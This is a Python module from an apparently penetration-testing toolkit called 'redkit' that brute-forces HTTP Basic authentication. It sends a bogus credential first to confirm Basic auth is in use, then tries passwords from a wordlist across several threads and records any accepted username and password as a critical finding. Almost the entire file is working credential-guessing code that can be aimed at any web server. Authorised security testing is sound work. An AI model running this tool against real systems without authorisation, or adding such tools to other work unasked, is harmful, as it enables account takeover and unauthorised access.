"""
modules/auth/basic_auth_bruteforce.py — HTTP Basic authentication brute-forcer.

First verifies the target actually speaks HTTP Basic (a bogus credential
must produce 401 with a ``WWW-Authenticate`` header) and aborts cleanly when
it does not — so pointing it at a non-Basic target produces zero requests
beyond the probe and zero findings. Success = any non-401 response after
Basic auth. Stops on first success; passwords are never logged in plaintext.
"""

import logging
import time
import uuid
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Event

from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.core.http_client import HttpClient
from redkit.core.resources import default_wordlist
from redkit.modules.auth.login_bruteforce import _mask_secret
from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_DEFAULT_WORDLIST = default_wordlist("passwords.txt")

_RATE_LIMIT_DELAY: float = 0.5


class BasicAuthBruteforcer(BaseModule):
    """Brute-force HTTP Basic authentication with 401/WWW-Authenticate gating."""

    name = "HTTP Basic Brute-Forcer"
    description = "Brute-forces HTTP Basic auth (gated on 401 + WWW-Authenticate detection)."
    author = "K4os"
    category = "auth"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "URL protected by HTTP Basic auth (e.g. https://example.com/admin).",
        },
        "username": {
            "value": None,
            "required": True,
            "description": "Username to use for all attempts.",
        },
        "wordlist": {
            "value": str(_DEFAULT_WORDLIST),
            "required": False,
            "type": str,
            "description": "Path to the password wordlist file.",
        },
        "threads": {
            "value": 5,
            "required": False,
            "type": int,
            "description": "Number of concurrent threads (default: 5).",
        },
        "timeout": {
            "value": 10,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 10).",
        },
    }

    @staticmethod
    def _load_wordlist(path: str) -> list[str]:
        """Load passwords, skipping blank and comment lines."""
        wl_path = Path(path)
        if not wl_path.is_file():
            logger.warning("Password wordlist not found: %s", path)
            return []
        with open(wl_path, encoding="utf-8", errors="ignore") as fh:
            return [line.strip() for line in fh if line.strip() and not line.startswith("#")]

    def _try_password(
        self,
        http: HttpClient,
        target: str,
        username: str,
        password: str,
        auth_header: str,
        stop_event: Event,
    ) -> str | None:
        """Attempt one Basic credential; return the password on success."""
        if stop_event.is_set():
            return None
        time.sleep(_RATE_LIMIT_DELAY)
        try:
            resp = http.get(target, headers={"Authorization": f"Basic {auth_header}"}, allow_redirects=False)
            if resp.status_code != 401:
                return password
        except Exception as exc:  # noqa: BLE001
            logger.debug("Request error with password '%s': %s", _mask_secret(password), exc)
        return None

    def run(self) -> None:
        """Gate on Basic auth, then brute-force with the wordlist."""
        self.clear_findings()
        self.validate_options()

        import base64

        target = self.get_option("target")
        username = self.get_option("username")
        wordlist_path = self.get_option("wordlist")
        threads = int(self.get_option("threads") or 5)
        http = self.http_client(target)

        # --- Gate: the target must respond 401 + WWW-Authenticate to bogus creds ---
        bogus = base64.b64encode(f"{username}:redkit-baseline-{uuid.uuid4().hex}".encode()).decode()
        try:
            probe = http.get(target, headers={"Authorization": f"Basic {bogus}"}, allow_redirects=False)
        except Exception as exc:  # noqa: BLE001
            logger.error("Baseline probe failed — aborting: %s", exc)
            return
        www_auth = probe.headers.get("WWW-Authenticate", "")
        if not (probe.status_code == 401 and "basic" in www_auth.lower()):
            logger.warning(
                "Target did not answer bogus credentials with 401 + WWW-Authenticate: Basic "
                "(got HTTP %d) — HTTP Basic auth not detected, aborting without findings.",
                probe.status_code,
            )
            return

        passwords = self._load_wordlist(wordlist_path)
        if not passwords:
            logger.error("Empty password list — aborting.")
            return

        stop_event = Event()
        logger.info(
            "HTTP Basic brute-force: target=%s, user=%s, passwords=%d, threads=%d",
            target,
            username,
            len(passwords),
            threads,
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Brute-forcing Basic auth on {target}", total=len(passwords))
            self._progress = progress

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures: dict[Future, str] = {}
                for pw in passwords:
                    header = base64.b64encode(f"{username}:{pw}".encode()).decode()
                    futures[
                        executor.submit(self._try_password, http, target, username, pw, header, stop_event)
                    ] = pw

                for future in as_completed(futures):
                    if stop_event.is_set():
                        future.cancel()
                        continue
                    pw = futures[future]
                    progress.advance(task)
                    try:
                        result = future.result()
                        if result:
                            stop_event.set()
                            logger.warning(
                                "HTTP Basic auth success for user '%s' — password withheld "
                                "from logs (see findings/report).",
                                username,
                            )
                            self.add_finding(
                                finding_type="HTTP Basic Auth",
                                severity="CRITICAL",
                                title=f"HTTP Basic credentials found: {username}:{result}",
                                detail=(
                                    f"The Basic-auth protected endpoint at {target} accepted "
                                    f"'{username}:{result}' (response was not 401)."
                                ),
                                evidence=(
                                    f"GET {target}\n"
                                    f"Authorization: Basic base64({username}:{result})\n"
                                    f"WWW-Authenticate challenge: {www_auth}"
                                ),
                                cvss=9.8,
                            )
                    except Exception as exc:  # noqa: BLE001
                        logger.debug("Future error for password '%s': %s", _mask_secret(pw), exc)

        total = len(self.get_findings())
        logger.info("HTTP Basic brute-force complete: %d valid credential(s) found.", total)
